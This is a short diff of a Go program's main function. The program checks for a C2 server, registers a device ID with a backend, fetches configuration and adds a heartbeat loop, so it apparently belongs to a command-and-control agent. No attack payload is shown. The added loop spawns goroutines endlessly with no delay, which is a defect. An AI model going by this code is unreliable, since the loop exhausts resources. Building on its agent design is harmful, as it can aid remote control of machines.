@@ -8,18 +8,25 @@ import (
 )
 
 /*
-	Runs fucntions in order.
+	Runs functions in order.
 */
 func main() {
 	log.InitLog(true)
 	config.ReadConfigFile()
+	helper.CheckForInternet()
+	helper.UpdateSystem()
 	helper.CheckForC2Server(config.Config.C2)
 	if !config.CheckIfDeviceIDExits() {
 		api.GetDeviceIDFromAPI()
-		config.AddDeviceIDtoYAML()
+		config.WriteConfToYAML()
 	}
 	api.GetConfFromBackend()
-	config.AddDeviceIDtoYAML()
+	config.WriteConfToYAML()
+	for {
+		go api.Heartbeat()
+
+	}
+
 
 	// api.GetDeviceIDFromAPI()
 	// config.AddDeviceIDtoYAML()
